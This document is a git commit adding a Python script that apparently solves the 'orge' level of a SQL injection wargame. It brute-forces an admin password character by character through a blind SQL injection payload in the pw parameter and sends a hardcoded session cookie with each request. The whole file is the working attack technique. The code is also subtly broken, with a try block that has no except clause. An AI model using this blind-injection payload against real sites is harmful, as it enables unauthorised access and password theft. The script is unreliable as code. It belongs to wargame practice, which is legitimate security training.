26386a7036c4520c132d3ceb0960c00410761a55
nacong <nabinyang37@gmail.com>
2021-03-23 22:51:30 +0900

    orge

---
+++ orge.py
@@ -0,0 +1,17 @@
+import urllib,requests
+
+
+password=""
+
+
+for j in range(1,9):                            # 1~8자리 패스워드를 찾아야함                                # 현재 몇번째 인지 표시
+  for i in range(48,128):                       # 대부분의 글자들 다 찾아내기
+    try:
+      url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1%27%20||%20%271%27=%271%27%20%26%26%20substr(pw," + str(j) +",1)%20=%20char(" + str(i) + ")%23"
+      r = requests.post(url,cookies=(dict(PHPSESSID="s20ng6d51pvch6b8o1pqg6sjpp")))
+      print("Error")
+      continue
+    if 'Hello admin' in r.text: 
+      password = password + chr(i)
+      print ("[+] PW " + str(j) + " : " + password)
+      break
